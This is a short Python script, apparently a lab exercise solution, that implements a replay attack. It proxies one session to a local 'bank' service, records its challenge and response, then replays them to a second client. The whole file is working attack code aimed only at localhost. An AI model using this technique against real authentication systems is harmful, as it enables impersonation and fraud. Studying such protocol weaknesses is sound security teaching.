import socket

def read_frame(sock):
    len_bytes = sock.recv(4)
    if not len_bytes:
        return None
    length = int.from_bytes(len_bytes, byteorder='big')
    data = sock.recv(length)
    return len_bytes + data

def run():
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind(('127.0.0.1', 3001))
    lsock.listen(5)
    
    print("Proxy ready.")
    
    #  CONNECTION 1
    client1, _ = lsock.accept()
    bank1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bank1.connect(('127.0.0.1', 3000))
    
    challengeA = read_frame(bank1)
    client1.sendall(challengeA)
    
    requestA = read_frame(client1)
    bank1.sendall(requestA)
    
    responseA = read_frame(bank1)
    client1.sendall(responseA)
    
    bank1.close()
    client1.close()
    
    print("Recorded Challenge A and Response A.")
    
    # CONNECTION 2
    client2, _ = lsock.accept()
    
    client2.sendall(challengeA)
    
    requestB = read_frame(client2)
    
    client2.sendall(responseA)
    
    client2.close()
    print("Replay attack completed.")

if __name__ == '__main__':
    run()
